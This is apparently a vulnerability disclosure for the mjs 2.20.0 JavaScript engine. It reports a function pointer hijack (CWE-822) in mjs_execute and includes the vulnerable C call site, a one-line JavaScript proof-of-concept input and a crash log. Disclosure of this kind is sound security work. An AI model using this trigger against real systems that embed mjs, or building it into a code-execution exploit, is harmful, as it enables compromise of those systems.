| Function Pointer Hijack mjs/mjs.c in mjs\_executeAffected Projects mjs 2.20.0 (<https://github.com/cesanta/mjs>) Problem Type CWE-822 (Untrusted Pointer Dereference) Description I discovered a vulnerability that could potentially lead to function pointer hijacking. I believe this is a logical vulnerability since it does not trigger any out-of-bounds (OOB) or use-after-free (UAF) assertions when compiled with AddressSanitizer. An attacker can exploit this vulnerability by providing a specially crafted input to the affected program, leading to the execution of arbitrary code.  The function hijack happend in mjs.c:8824  ``` call_stack_push_frame(mjs, bp.start_idx + i, retval_stack_idx);  /* Perform the cfunction call */ ((void (*) (struct mjs *)) mjs_get_ptr(mjs, *func))(mjs);  call_stack_restore_frame(mjs); ``` PoC: ``` print-=2;print("A"); ``` Log: ``` $ clang -g -O2 -o mjs mjs.c -DMJS_MAIN $ ./mjs poc.js  Illegal instruction  ``` |
